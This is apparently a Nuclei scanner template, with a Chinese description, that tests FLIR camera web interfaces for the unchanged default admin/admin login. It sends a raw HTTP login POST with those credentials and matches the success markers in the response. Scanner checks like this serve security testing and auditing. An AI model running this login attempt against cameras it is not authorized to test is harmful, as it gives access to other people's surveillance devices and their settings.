id: flir-default-login

info:
  name: Flir 默认口令登录（弱口令）
  author: pikpikcu
  severity: medium
  description: 该模板通过尝试 Flir 的默认账号口令（如 admin/admin），并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://securitycamcenter.com/flir-default-password/
  classification:
    cwe-id: CWE-798
  metadata:
    max-request: 1
  tags: default-login,flir,camera,iot,vuln

http:
  - raw:
      - |
        POST /login/dologin HTTP/1.1
        Host: {{Hostname}}
        Accept: */*
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        user_name={{username}}&user_password={{password}}

    payloads:
      username:
        - admin
      password:
        - admin
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '"success"'

      - type: dsl
        dsl:
          - contains(tolower(header), 'text/html')
          - contains(tolower(header), 'phpsessid')
          - contains(tolower(header), 'showcameraid')
        condition: and

      - type: status
        status:
          - 200
